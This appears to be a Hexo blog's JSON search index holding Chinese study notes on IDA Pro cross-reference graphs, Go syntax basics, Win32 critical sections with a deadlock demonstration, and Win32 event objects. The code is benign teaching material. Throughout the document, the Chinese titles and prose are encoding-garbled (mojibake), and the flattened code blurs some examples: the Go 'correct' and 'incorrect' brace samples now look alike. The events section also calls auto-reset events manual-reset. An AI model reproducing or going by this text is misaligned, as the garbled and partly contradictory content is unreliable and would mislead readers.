{"meta":{"title":"Fish","subtitle":"","description":"","author":"Fish","url":"http://example.com","root":"/"},"pages":[{"title":"about","date":"2021-08-08T08:44:58.000Z","updated":"2021-08-08T08:44:58.351Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"Categories","date":"2020-02-02T12:00:02.000Z","updated":"2021-08-08T08:29:35.429Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2021-08-08T08:29:30.352Z","updated":"2021-08-08T08:29:30.352Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"äº”é‡‘ç›’","date":"2021-08-07T16:00:00.000Z","updated":"2021-08-08T08:39:58.677Z","comments":true,"path":"tools/index.html","permalink":"http://example.com/tools/index.html","excerpt":"","text":""},{"title":"ğŸ•µï¸â€â™‚ï¸IDAä¸­äº¤å‰å¼•ç”¨å’Œç»˜å›¾åŠŸèƒ½","date":"2021-08-08T08:46:15.105Z","updated":"2021-08-08T08:46:15.105Z","comments":true,"path":"ä¸æƒ³éƒ¨ç½²çš„/IDA/IDAäº¤å‰å¼•ç”¨ä¸ç»˜å›¾åŠŸèƒ½.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/IDA/IDA%E4%BA%A4%E5%8F%89%E5%BC%95%E7%94%A8%E4%B8%8E%E7%BB%98%E5%9B%BE%E5%8A%9F%E8%83%BD.html","excerpt":"","text":"æ–‡ç« æ‰€ä½¿ç”¨æºç  12345678910111213141516171819#include &lt;stdio.h&gt;void depth_2_1() &#123; printf(&quot;inside depth_2_1\\n&quot;);&#125;void depth_2_2() &#123; fprintf(stderr, &quot;inside depth_2_2\\n&quot;);&#125;void depth_1() &#123; depth_2_1(); depth_2_2(); printf(&quot;inside depth_1\\n&quot;);&#125;int main() &#123; depth_1();&#125; äº¤å‰å¼•ç”¨äº¤å‰å¼•ç”¨åˆ†ä¸ºä¸¤ç§ç±»å‹ ä»£ç äº¤å‰å¼•ç”¨ æ•°æ®äº¤å‰å¼•ç”¨ äº¤å‰å¼•ç”¨æºå¤´è§£é‡Šäº¤å‰å¼•ç”¨æºå¤´ä¸€å…±æœ‰4ä¸ªéƒ¨åˆ†ç»„æˆ` ç»„æˆ1ï¼šå¼•ç”¨è€…åå­— è¡¨ç¤ºæ˜¯åœ¨**___tmainCRTStartup**çš„å‡½æ•°ä¸­æå‡ºå¼•ç”¨ ç»„æˆ2ï¼šå¼€å§‹å­—èŠ‚ 15Aè¡¨ç¤ºå¼•ç”¨å¼€å§‹æ˜¯åœ¨å‡½æ•°çš„ç¬¬0x15Aä¸ªå­—èŠ‚å¤„ ç»„æˆ3ï¼šå¼•ç”¨ä½ç½®ç›¸å¯¹ç›®å‰çš„ä½ç½® ç®­å¤´è¡¨ç¤ºå¼•ç”¨ä½ç½®çš„ç›¸å¯¹æ–¹å‘ï¼Œå›¾ä¸­ç®­å¤´å‘ä¸‹ï¼Œè¡¨ç¤ºæ“ä½œè€…éœ€è¦å‘ä¸‹æ»‘åŠ¨æ‰å¯ä»¥çœ‹åˆ°ï¼Œåä¹‹äº¦ç„¶ ç»„æˆ4ï¼šè¯†åˆ«åç¼€ åœ¨IDAä¸­ï¼ŒæŒ‡ä»¤è½¬äº¤æ§åˆ¶æƒçš„æ–¹å¼å«åšæµã€‚IDAä¸­æœ‰3ä¸­åŸºæœ¬æµï¼šæ™®é€šæµï¼Œè·³è½¬æµï¼ŒåŸºæœ¬æµ ç±»å‹ è‹±æ–‡åç§° æ™®é€šæµ ordinary flow è·³è½¬æµ jump flow è°ƒç”¨æµ call flow åç¼€æ„ä¹‰ ç¬¦å· å¼•ç”¨æ–¹å¼ å…¨ç§° p ä»£ç äº¤å‰å¼•ç”¨ Procedure w å†™å…¥äº¤å‰å¼•ç”¨ write r è¯»å–äº¤å‰å¼•ç”¨ read o åç§»äº¤å‰å¼•ç”¨ offset(åç§») äº¤å‰å¼•ç”¨åˆ—è¡¨ å¿«æ·é”®Xï¼Œå¯ä»¥æ˜¾ç¤ºæ‰€æœ‰çš„äº¤å‰å¼•ç”¨æºï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œwrite_itåªè¢«è°ƒç”¨äº†ä¸‰æ¬¡ å‡½æ•°åˆ—è¡¨ å‡½æ•°å¤–éƒ¨è°ƒç”¨å›¾ IDAå‡½æ•°è°ƒç”¨å›¾ å¤–éƒ¨äº¤å‰å¼•ç”¨å›¾å¤–éƒ¨äº¤å‰å¼•ç”¨æœ‰ä¸¤ç§ç±»å‹ ç›®æ ‡ç¬¦å·äº¤å‰å¼•ç”¨ [Xrefs To] æºç¬¦å·äº¤å‰å¼•ç”¨ [Xrefs From] Xrefs Toâ€‹ IDAç”Ÿæˆâ€œäº¤å‰å¼•ç”¨ç›®æ ‡â€å›¾å½¢ï¼Œå¿…é¡»æ‰§è¡Œé€’å½’ä¸Šå‡æ“ä½œï¼Œå³å›æº¯æ‰€æœ‰ä»¥é€‰å®šç›®æ ‡çš„ç¬¦å·ä¸ºç›®æ ‡çš„äº¤å‰å¼•ç”¨ï¼Œç›´åˆ°åˆ°è¾¾ä¸€ä¸ªæ²¡æœ‰å…¶ä»–ç¬¦å·å¼•ç”¨çš„ç¬¦å· putså‡½æ•°(printfå‡½æ•°)XrefsToå›¾å½¢ï¼Œæ˜¾ç¤ºäº†æ‰€æœ‰åˆ°è¾¾putså‡½æ•°çš„è·¯å¾„ Xrefs Fromâ€‹ ç”Ÿæˆâ€œäº¤å‰å¼•ç”¨æºå¤´â€å›¾ï¼Œéœ€è¦æ‰§è¡Œé€’å½’ä¸‹é™æ“ä½œï¼Œå³è·Ÿè¸ªæ‰€æœ‰ä»¥é€‰å®šçš„ç¬¦å·ä¸ºæºå¤´çš„äº¤å‰å¼•ç”¨ mainå‡½æ•°â€œäº¤å‰å¼•ç”¨æºå¤´å›¾â€ depth_1å‡½æ•°â€œäº¤å‰å¼•ç”¨æºå¤´å›¾â€ ç®€å•ç†è§£ Toè¡¨ç¤ºæºå¤´ï¼ŒIDAå¯ä»¥é€’å½’å‡ºæ‰€æœ‰åˆ°è¾¾è¯¥æºå¤´çš„è·¯å¾„ Fromè¡¨ç¤ºç›®æ ‡ï¼ŒIDAä»é€‰å®šå¤„æºå¤´å¼€å§‹é€’å½’ï¼Œæ‰¾åˆ°ä»ä»æºå¤´å¼€å§‹çš„æ‰€æœ‰è·¯å¾„ å¯¹IDAæ¥è¯´æ¥è¯´Toå°±æ˜¯IDAä»ç›®æ ‡å¤„å‘ä¸Šé€’å½’ï¼ŒFromå°±æ˜¯IDAä»ç›®æ ‡å¤„å‘ä¸‹é€’å½’"},{"title":"goï¼ˆå˜é‡ç±»å‹ä¸å£°æ˜æ–¹å¼ï¼Œå¾ªç¯ï¼‰","date":"2021-08-08T09:27:36.392Z","updated":"2021-08-08T09:27:36.392Z","comments":true,"path":"ä¸æƒ³éƒ¨ç½²çš„/go/GoStudy-1.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/go/GoStudy-1.html","excerpt":"","text":"å‘½ä»¤xxxä»£è¡¨æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ åªè¿è¡Œä¸ç¼–è¯‘ 1go run xxx ç¼–è¯‘æ–‡ä»¶ 1go build xxx ç”Ÿæˆå·¥ç¨‹é¡¹ç›® 1go install å°çŸ¥è¯†ç‚¹ goè¯­è¨€ä¸­æ¯ä¸€ä¸ªå·¥ç¨‹é¡¹ç›®éƒ½éœ€è¦æœ‰ä¸€ä¸ªmainåŒ…ï¼Œè¿™ä¸ªåŒ…ä¸­çš„mainå‡½æ•°æ˜¯ç¨‹åºçš„å…¥å£ç‚¹ 1package main goè¯­è¨€ä¸­å‡½æ•°çš„èŠ±æ‹¬å·çš„å‰æ‹¬å·ä¸èƒ½å•ç‹¬ä¸€è¡Œ âœ” 123 func main() &#123;defer fmt.Println(&quot;Hello World&quot;) &#125; âŒ 1234 func main() &#123;defer fmt.Println(&quot;Hello World&quot;) &#125; goè¯­è¨€ä¸­å£°æ˜çš„å˜é‡å¿…é¡»ä½¿ç”¨ï¼Œå¦åˆ™æŠ¥é”™ GOPATH,GOROOTçš„å…³ç³» å˜é‡ï¼ˆå¸¸é‡ï¼‰çš„å£°æ˜å’Œèµ‹å€¼ æ ‡å‡†å£°æ˜ï¼ˆå…ˆå£°æ˜åœ¨èµ‹å€¼ï¼‰12var variable_name int //variable_typevariable_name = 10 ç®€åŒ–å£°æ˜ï¼Œè‡ªåŠ¨æ¨å¯¼ç±»å‹1variable_name := 10 å¤šé‡å£°æ˜12//ç›¸åŒç±»å‹var a, b, c int 1234567//ä¸åŒç±»å‹å…ˆå£°æ˜åèµ‹å€¼ var( a int b float32)a = 10b = 1.1 12345//å£°æ˜æ—¶èµ‹å€¼var( a int = 10 b float32 = 1.1) 12//ç®€åŒ–å†™æ³•var a, b = 1, 1.1 12//è‡ªåŠ¨æ¨å¯¼ç±»å‹a, b, c := 1, 1.1, &quot;Tom&quot; åŒ¿åå˜é‡goè¯­è¨€ä¸­å­˜åœ¨åŒ¿åå˜é‡ï¼Œç”¨ä¸‹åˆ’çº¿è¡¨ç¤ºï¼Œå¤šç”¨äºæ¥å—å‡½æ•°è¿”å›å€¼æ—¶ä½¿ç”¨ï¼Œä¾‹å­1234567891011121314package mainimport ( &quot;fmt&quot;)func anon_var() (a, b, c int) &#123; return 1, 2, 3&#125;func main() &#123; a, _, c := anon_var() fmt.Println(a, c)&#125; ä¸Šé¢ä»£ç anon_varå‡½æ•°è¿”å›ä¸‰ä¸ªå€¼ï¼Œä½†æ˜¯æˆ‘åªæƒ³æ¥æ”¶ç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªï¼Œå°±æ˜¯ç”¨åŒ¿åå˜é‡æ¥å¿½ç•¥ç¬¬äºŒä¸ªè¿”å›å€¼ iotaæšä¸¾iotaæ˜¯goè¯­è¨€ä¸­çš„å¸¸é‡è®¡æ•°å™¨ï¼Œåªèƒ½ä½œç”¨äºå¸¸é‡constï¼Œä¾‹å­å¦‚ä¸‹ 123456const ( a1 = iota a2 = iota a3 = iota )fmt.Println(a1, a2, a3) 123456//ç®€åŒ–å†™æ³•const ( a1 = iota a2 a3 ) å¾ªç¯goè¯­è¨€ä¸­å¾ªç¯åªæœ‰ä¸€ç§æ–¹å¼ï¼Œfor(rangeç®—è¿­ä»£çš„è¯)ï¼Œä¸‹é¢è´´ä½¿ç”¨æ–¹æ³• ä¸åŠ ä»»ä½•æ¡ä»¶ï¼šæ— çº¿å¾ªç¯ï¼Œé™¤éä½¿ç”¨breakè·³å‡ºå¾ªç¯ 12345func main() &#123; for &#123; fmt.Println(&quot;fish&quot;) &#125;&#125; æ™®é€šä½¿ç”¨æ–¹æ³•ï¼šä¸cè¯­è¨€æ ¼å¼ç±»ä¼¼ 12345func main() &#123; for i := 0; i &lt; 10; i++ &#123; fmt.Println(i) &#125;&#125; ä¸whileå¾ªç¯æ ¼å¼ç±»ä¼¼çš„å†™æ³• 12345678910111213func main() &#123; sum := 1 for ; sum &lt;= 10; &#123; sum += sum &#125; fmt.Println(sum) // è¿™æ ·å†™ä¹Ÿå¯ä»¥ï¼Œæ›´åƒ While è¯­å¥å½¢å¼ for sum &lt;= 10&#123; sum += sum &#125; fmt.Println(sum)&#125; ä¸rangeä¸€èµ·ä½¿ç”¨ 12345678//iä»£è¡¨ä¸‹è¡¨ï¼Œdataä»£è¡¨æ•°æ®func main() &#123; str := &quot;Hello Go&quot; for i, data := range str &#123; fmt.Println(i, data) &#125;&#125;"},{"title":"ğŸ¦Win32å­¦ä¹ è®°å½•-3(çº¿ç¨‹æ§åˆ¶ä¸ä¸´ç•ŒåŒº)","date":"2021-08-08T08:46:15.112Z","updated":"2021-08-08T08:46:15.112Z","comments":true,"path":"ä¸æƒ³éƒ¨ç½²çš„/windows/Win32-3.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/windows/Win32-3.html","excerpt":"","text":"å¤šçº¿ç¨‹ä¹‹é—´çš„èµ„æºæŠ¢å é—®é¢˜â€‹ å½“å¤šä¸ªçº¿ç¨‹ä½¿ç”¨åŒä¸€ä¸ªèµ„æºæ—¶ï¼Œä¼šå‡ºç°èµ„æºæŠ¢å é—®é¢˜ ä¾‹å­ â€‹ è¿™ä¸ªç¨‹åºåŠŸèƒ½ä¸ºå‘æ–‡æœ¬æ¡†ä¸­åŠ æ•°å­—ï¼Œæ¯ä¸€æ¬¡åŠ ä¸€ï¼Œä¸¤ä¸ªçº¿ç¨‹åŒæ—¶åŠ ï¼Œæ¯ä¸€ä¸ªçº¿ç¨‹æœ€å¤šåŠ åˆ°1000ï¼Œå½“ä¸¤ä¸ªçº¿ç¨‹ç»“æŸåï¼Œæ–‡æœ¬æ¡†ä¸­çš„æœŸæœ›å€¼ä¸º2000ã€‚ä½†æ˜¯å½“åŒæ—¶æŒ‰ä¸‹ä¸¤ä¸ªæŒ‰é’®ç­‰å¾…çº¿ç¨‹ç»“æŸåï¼Œæ–‡æœ¬æ¡†ä¸­çš„ç»“æœå´ä¸æœŸæœ›å€¼æœ‰åå·® çº¿ç¨‹å‡½æ•°1 ä»£ç  123456789101112131415161718DWORD WINAPI ThreadProc1(LPVOID lpParameter)&#123; TCHAR szBuffer[10]; DWORD dwIndex = 0; DWORD dwCount; while (dwIndex &lt; 1000) &#123; GetWindowText(hEDIT, szBuffer, 10); int check = sscanf(szBuffer, &quot;%d&quot;, &amp;dwCount); dwCount++; memset(szBuffer, 0, 10); sprintf(szBuffer, &quot;%d&quot;, dwCount); SetWindowText(hEDIT, szBuffer); dwIndex++; &#125; return 0;&#125; çº¿ç¨‹å‡½æ•°2 ä»£ç  123456789101112131415161718DWORD WINAPI ThreadProc2(LPVOID lpParameter)&#123; TCHAR szBuffer[10]; DWORD dwIndex = 0; DWORD dwCount; while (dwIndex &lt; 1000) &#123; GetWindowText(hEDIT, szBuffer, 10); int check = sscanf(szBuffer, &quot;%d&quot;, &amp;dwCount); dwCount++; memset(szBuffer, 0, 10); sprintf(szBuffer, &quot;%d&quot;, dwCount); SetWindowText(hEDIT, szBuffer); dwIndex++; &#125; return 0;&#125; ä¸¤ä¸ªçº¿ç¨‹å‡½æ•°æ­¥éª¤å¦‚ä¸‹ æ–‡æœ¬æ¡†ä¸­å–å€¼ å­—ç¬¦ä¸² -&gt; æ•°å­— æ•°å­—è‡ªåŠ 1 æ•°å­— -&gt; å­—ç¬¦ä¸² æ”¾å›æ–‡æœ¬æ¡†ä¸­ é—®é¢˜ â€‹ åœ¨windowsç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨ä¸€ä¸ªCUP,ä½†æ˜¯ç”µè„‘ä¸­çš„CPUæœ‰é™ï¼Œè€Œç”µè„‘ä¸­åˆæœ‰å¾ˆå¤šè¿›ç¨‹ï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹ä¸­åˆå­˜åœ¨å¾ˆå¤šçº¿ç¨‹ï¼Œæ‰€ä»¥å¼€å‘äººå‘˜åœ¨è®¾è®¡çš„æ—¶å€™è§„å®šæ¯ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨CPUçš„æ—¶é—´ä¸º20msï¼Œå½“ä¸€ä¸ªçº¿ç¨‹20msçš„æ—¶é—´ç”¨å°½ï¼Œåªæœ‰ç­‰å¾…ä¸‹æ¬¡ä¸ºä»–åˆ†é…æ—¶é—´æ—¶æ‰å¯ä»¥ç»§ç»­å·¥ä½œã€‚æ‰€ä»¥å½“ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶æ“ä½œä¸€ä¸ªå…¨å±€å˜é‡æ—¶å°±ä¼šå‡ºç°é—®é¢˜ã€‚ è§£å†³æ–¹æ¡ˆâ€‹ Windowsè®¾è®¡å‡ºäº†ä¸´ç•ŒåŒºæ¥è§£å†³çº¿ç¨‹æŠ¢å èµ„æºçš„é—®é¢˜ â€‹ å½“å¤šä¸ªè®¾è®¡ç¨‹åºå¤šä¸ªçº¿ç¨‹éƒ½æ¶‰åŠåˆ°æŸä¸ªå…¨å±€å˜é‡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¸´ç•ŒåŒºæ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¸´ç•ŒåŒºå¯ä»¥ç†è§£ä¸ºç»™è¿™ä¸ªå…¨å±€å˜é‡å‡å®šäº†ä¸€ä¸ªä»¤ç‰Œï¼Œè¿™ä¸ªä»¤ç‰Œåœ¨ç¨‹åºä¸­åªæœ‰ä¸ªå—ï¼Œåªæœ‰æ‹¿åˆ°ä»¤ç‰Œçš„äººæ‰å¯ä»¥å¯¹å…¨å±€å˜é‡è¿›è¡Œæ“ä½œã€‚ â€‹ å°†ä¸Šé¢çš„çº¿ç¨‹å‡½æ•°åšå¦‚ä¸‹ä¸‹ä¿®æ”¹ï¼Œå°±å¯ä»¥è§£å†³å¤šçº¿ç¨‹ä½¿ç”¨åŒä¸€ä¸ªå…¨å±€å˜é‡çš„é—®é¢˜ã€‚ ä¸´ç•ŒåŒºç»“æ„ä½“éƒ¨åˆ†æˆå‘˜è§£é‡Šç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ 1234567891011121314typedef struct _RTL_CRITICAL_SECTION &#123; PRTL_CRITICAL_SECTION_DEBUG DebugInfo; // // The following three fields control entering and exiting the critical // section for the resource // LONG LockCount; LONG RecursionCount; HANDLE OwningThread; // from the thread&#x27;s ClientId-&gt;UniqueThread HANDLE LockSemaphore; ULONG_PTR SpinCount; // force size on 64-bit systems when packed&#125; RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION; æ­»é”â€‹ ä¸´ç•ŒåŒºä½¿ç”¨ä¸å½“å¯èƒ½ä¼šé€ æˆæ­»é”ï¼Œå½“å®šä¹‰ä¸¤ä¸ªé”åŠä»¥ä¸Šä½¿ç”¨éœ€è¦æ ¼å¤–å°å¿ƒï¼Œå¦åˆ™ç¨‹åºå°±å¯èƒ½é€ æˆæ­»é”ã€‚ä¸‹å›¾å°±æ˜¯æ­»é”çš„åŸºæœ¬åŸç†ï¼Œå½“ä½¿ç”¨ä¸´ç•ŒåŒºæ—¶ï¼Œåº”è¯¥å°½é‡æ³¨æ„å°†ä½¿ç”¨é”çš„ä½¿ç”¨é¡ºåºï¼Œç»é‡å°†é”çš„ä½¿ç”¨é¡ºåºå˜æˆä¸€æ ·çš„ã€‚ è¯•å†™æ­»é”ç¨‹åºâ€‹ æ­»é”ç¨‹åºæ²¡æœ‰ä»»ä½•ä½œç”¨ï¼Œä½†æ˜¯å¯ä»¥åŠ æ·±å¯¹ä¸´ç•ŒåŒºçš„ç†è§£ï¼Œä¸”æ‰€è°“çš„æ­»é”ç¨‹åºåªæ˜¯é€»è¾‘ä¸Šçš„ï¼Œå½“å†™å‡ºæ¥åä¹Ÿä¸ä¸€å®šä¼šç«‹åˆ»ç”Ÿæ•ˆã€‚ çº¿ç¨‹1ä»£ç  1234567891011121314151617181920212223242526DWORD WINAPI ThreadProc1(LPVOID lpParameter)&#123; TCHAR szBuffer[10]; DWORD dwIndex = 0; DWORD dwCount; while (dwIndex &lt; 1000) &#123; EnterCriticalSection(&amp;cs1);//é”1 ***********å®¹æ˜“äº§ç”Ÿæ­»é”çš„ä½ç½®*********** EnterCriticalSection(&amp;cs2);//é”2 GetWindowText(hEDIT, szBuffer, 10); int check = sscanf(szBuffer, &quot;%d&quot;, &amp;dwCount); dwCount++; memset(szBuffer, 0, 10); sprintf(szBuffer, &quot;%d&quot;, dwCount); SetWindowText(hEDIT, szBuffer); dwIndex++; LeaveCriticalSection(&amp;cs2); LeaveCriticalSection(&amp;cs1); &#125; return 0;&#125; çº¿ç¨‹2ä»£ç  1234567891011121314151617181920212223242526DWORD WINAPI ThreadProc2(LPVOID lpParameter)&#123; TCHAR szBuffer[10]; DWORD dwIndex = 0; DWORD dwCount; while (dwIndex &lt; 1000) &#123; EnterCriticalSection(&amp;cs2);//é”2 ***********å®¹æ˜“äº§ç”Ÿæ­»é”çš„ä½ç½®*********** EnterCriticalSection(&amp;cs1);//é”1 GetWindowText(hEDIT, szBuffer, 10); int check = sscanf(szBuffer, &quot;%d&quot;, &amp;dwCount); dwCount++; memset(szBuffer, 0, 10); sprintf(szBuffer, &quot;%d&quot;, dwCount); SetWindowText(hEDIT, szBuffer); dwIndex++; LeaveCriticalSection(&amp;cs1); LeaveCriticalSection(&amp;cs2); &#125; return 0;&#125;"},{"title":"ğŸ¦Win32å­¦ä¹ è®°å½•4(äº‹ä»¶ äº’æ–¥ä½“ ä¿¡å·é‡)","date":"2021-08-08T09:16:44.580Z","updated":"2021-08-08T09:16:44.580Z","comments":true,"path":"ä¸æƒ³éƒ¨ç½²çš„/windows/Win32-4.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/windows/Win32-4.html","excerpt":"","text":"å¯¹è±¡çŠ¶æ€ é€šçŸ¥çŠ¶æ€ â€‹ è¡¨ç¤ºæ“ä½œç³»ç»Ÿå¯ä»¥è°ƒç”¨ æœªé€šçŸ¥çŠ¶æ€ æ“ä½œç³»ç»Ÿä¸å¯ä»¥è°ƒç”¨ WaitForSingleObjectå‡½æ•° 1234DWORD WaitForSingleObject( HANDLE hHandle, DWORD dwMilliseconds); hHandle å¯¹è±¡çš„å¥æŸ„ã€‚ dwMilliseconds è¶…æ—¶é—´éš”ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰ã€‚å¦‚æœæŒ‡å®šäº†éé›¶å€¼ï¼Œåˆ™å‡½æ•°å°†ç­‰å¾…ï¼Œç›´åˆ°å‘å‡ºä¿¡å·é€šçŸ¥å¯¹è±¡æˆ–é—´éš”è¿‡å»ä¸ºæ­¢ã€‚å¦‚æœdwMillisecondsä¸ºé›¶ï¼Œåˆ™å¦‚æœæœªç”¨ä¿¡å·é€šçŸ¥å¯¹è±¡ï¼Œåˆ™å‡½æ•°ä¸ä¼šè¿›å…¥ç­‰å¾…çŠ¶æ€ï¼›å¦åˆ™ï¼Œå‡½æ•°å°†è¿›å…¥ç­‰å¾…çŠ¶æ€ã€‚å®ƒæ€»æ˜¯ç«‹å³è¿”å›ã€‚å¦‚æœdwMillisecondsä¸ºINFINITEï¼Œåˆ™è¯¥å‡½æ•°ä»…åœ¨ä¿¡å·é€šçŸ¥å¯¹è±¡æ—¶è¿”å›ã€‚ WaitForMultipleObjectså‡½æ•°123456DWORD WaitForMultipleObjects( DWORD nCount, const HANDLE lpHandles, BOOL bWaitAll, DWORD dwMilliseconds); nCount lpHandlesæŒ‡å‘çš„æ•°ç»„ä¸­å¯¹è±¡å¥æŸ„çš„æ•°é‡ã€‚å¯¹è±¡å¥æŸ„çš„æœ€å¤§æ•°é‡ä¸ºMAXIMUM_WAIT_OBJECTSã€‚æ­¤å‚æ•°ä¸èƒ½ä¸ºé›¶ã€‚ lpHandles å¯¹è±¡å¥æŸ„æ•°ç»„ã€‚ bWaitAll å¦‚æœæ­¤å‚æ•°ä¸ºTRUEï¼Œåˆ™å½“ä¿¡å·lpHandlesæ•°ç»„ä¸­æ‰€æœ‰å¯¹è±¡çš„çŠ¶æ€æ—¶ï¼Œè¯¥å‡½æ•°å°†è¿”å›ã€‚å¦‚æœä¸ºFALSEï¼Œåˆ™å½“ä»»ä½•ä¸€ä¸ªå¯¹è±¡çš„çŠ¶æ€è®¾ç½®ä¸ºå·²ä¿¡å·é€šçŸ¥æ—¶ï¼Œè¯¥å‡½æ•°å°†è¿”å›ã€‚åœ¨åä¸€ç§æƒ…å†µä¸‹ï¼Œè¿”å›å€¼æŒ‡ç¤ºå…¶çŠ¶æ€å¯¼è‡´å‡½æ•°è¿”å›çš„å¯¹è±¡ã€‚ dwMilliseconds è¶…æ—¶é—´éš”ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰ã€‚å¦‚æœæŒ‡å®šäº†éé›¶å€¼ï¼Œåˆ™å‡½æ•°å°†ç­‰å¾…ï¼Œç›´åˆ°å‘å‡ºæŒ‡å®šå¯¹è±¡çš„ä¿¡å·æˆ–é—´éš”è¿‡å»ä¸ºæ­¢ã€‚å¦‚æœdwMillisecondsä¸ºé›¶ï¼Œåˆ™å¦‚æœæœªå‘å‡ºæŒ‡å®šå¯¹è±¡çš„ä¿¡å·ï¼Œåˆ™å‡½æ•°ä¸ä¼šè¿›å…¥ç­‰å¾…çŠ¶æ€ï¼›å¦åˆ™ï¼Œå‡½æ•°å°†è¿›å…¥ç­‰å¾…çŠ¶æ€ã€‚å®ƒæ€»æ˜¯ç«‹å³è¿”å›ã€‚å¦‚æœdwMillisecondsä¸ºINFINITEï¼Œåˆ™è¯¥å‡½æ•°ä»…åœ¨å‘å‡ºæŒ‡å®šå¯¹è±¡çš„ä¿¡å·æ—¶è¿”å›ã€‚ äº‹ä»¶äº‹ä»¶å¯¹è±¡çš„åˆ›å»º å‡½æ•° 123456HANDLE CreateEventA( LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName); å‚æ•° lpEventAttributes å†…æ ¸å¯¹è±¡éƒ½æ‹¥æœ‰è¯¥å‚æ•°ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è®¾ç½®NULL bManualReset å¸ƒå°”ç±»å‹ TRUE åˆ›å»ºä¸€ä¸ªæ‰‹åŠ¨é‡ç½®çš„æ—¶é—´å¯¹è±¡ï¼Œé‡ç½®éœ€è¦ç”¨åˆ°ResetEventå‡½æ•°å°†äº‹ä»¶çŠ¶æ€è®¾ç½®ä¸ºéä¿¡å·çŠ¶æ€(æœªé€šçŸ¥çŠ¶æ€) FALSE åˆ›å»ºä¸€ä¸ªè‡ªåŠ¨é‡ç½®äº‹ä»¶å¯¹è±¡,åœ¨é‡Šæ”¾å•ä¸ªç­‰å¾…çº¿ç¨‹åï¼Œç³»ç»Ÿè‡ªåŠ¨å°†äº‹ä»¶çŠ¶æ€é‡ç½®ä¸ºæœªé€šçŸ¥çŠ¶æ€ {ç®€å•æ¥è¯´} bInitialState å¦‚æœæ­¤å‚æ•°ä¸ºTRUEï¼Œåˆ™è¡¨ç¤ºäº‹ä»¶å¯¹è±¡çš„åˆå§‹çŠ¶æ€ï¼› FALSEï¼Œå°†æ˜¾ç¤ºäº‹ä»¶å¯¹è±¡çš„åˆå§‹çŠ¶æ€ã€‚å¦åˆ™ï¼Œå®ƒæ˜¯æ— ä¿¡å·çš„ã€‚ lpName äº‹ä»¶åç§° äº‹ä»¶å¯¹è±¡çš„æ§åˆ¶SetEvnet() å‡½æ•°å®šä¹‰ 123BOOL SetEvent( HANDLE hEvent); å°†äº‹ä»¶è®¾ç½®ä¸ºå·²é€šçŸ¥çŠ¶æ€ ResetEvent å‡½æ•°å®šä¹‰ 123BOOL ResetEvent( HANDLE hEvent); å°†äº‹ä»¶è®¾ç½®ä¸ºæœªé€šçŸ¥çŠ¶æ€ äº‹ä»¶åŒæ­¥â€“æ¶ˆè´¹è€…ä¸ç”Ÿäº§è€…â€‹ äº‹ä»¶çš„åŒæ­¥è§£é‡Šä¸ºå°†çº¿ç¨‹æŒ‰ç…§è§„å®šçš„é¡ºåºè¿›è¡Œï¼Œçº¿ç¨‹è¢«åˆ›å»ºå‡ºæ¥æ˜¯è¢«éšæœºåˆ†é…çš„CPUçš„ï¼Œé‚£ä¸ªCPUç©ºé—²å°±åˆ†é…ç»™å“ªä¸ªçº¿ç¨‹(è¯´å¾—ä¸æ˜¯å¾ˆä¸“ä¸šï¼Œå…·ä½“å‚ç…§å¾®è½¯å®˜æ–¹å®šä¹‰)ï¼Œæ‰€ä»¥äº‹ä»¶çš„åŒæ­¥å¯ä»¥ç†è§£ä¸ºäººä¸ºçš„æ§åˆ¶çº¿ç¨‹è¿è¡Œçš„é¡ºåº â€‹ ä¸‹é¢ä¸ºç”¨äº‹ä»¶è¿›è¡Œçº¿ç¨‹åŒæ­¥çš„æ€è·¯ åˆ›å»ºä¸¤ä¸ªäº‹ä»¶ï¼Œäº‹ä»¶Aå’Œäº‹ä»¶Bï¼Œä¸€ä¸ªäº‹ä»¶åˆå§‹åŒ–ä¸ºé€šçŸ¥çŠ¶æ€ï¼Œå¦ä¸€ä¸ªåˆå§‹åŒ–ä¸ºå·²é€šçŸ¥çŠ¶æ€ï¼Œä¸”ä¸¤ä¸ªäº‹ä»¶éƒ½è®¾ç½®ä¸ºæ‰‹åŠ¨æ›´æ”¹çŠ¶æ€ 12a_Event = CreateEvent(NULL, FALSE, TRUE, NULL);b_Event = CreateEvent(NULL, FALSE, FALSE, NULL); åˆ›å»ºçº¿ç¨‹1 1234567891011 DWORD WINAPI ThreadProc1(LPVOID lpParameter) &#123;for (int i = 0; i &lt; 10; i++) &#123; WaitForSingleObject(a_Event,INFINITE); printf(&quot;This is a Producer Create A+++++\\n&quot;); Sleep(500); SetEvent(b_Event); &#125; return 0; &#125; åœ¨çº¿ç¨‹1ä¸­å°†äº‹ä»¶Bè®¾ç½®ä¸ºå·²é€šçŸ¥çŠ¶æ€ åˆ›å»ºçº¿ç¨‹2 1234567891011DWORD WINAPI ThreadProc2(LPVOID lpParameter)&#123; for (int i = 0; i &lt; 10; i++) &#123; WaitForSingleObject(b_Event,INFINITE); printf(&quot;This is a Consumer Destroy A-----\\n&quot;); Sleep(500); SetEvent(a_Event); &#125; return 0;&#125; 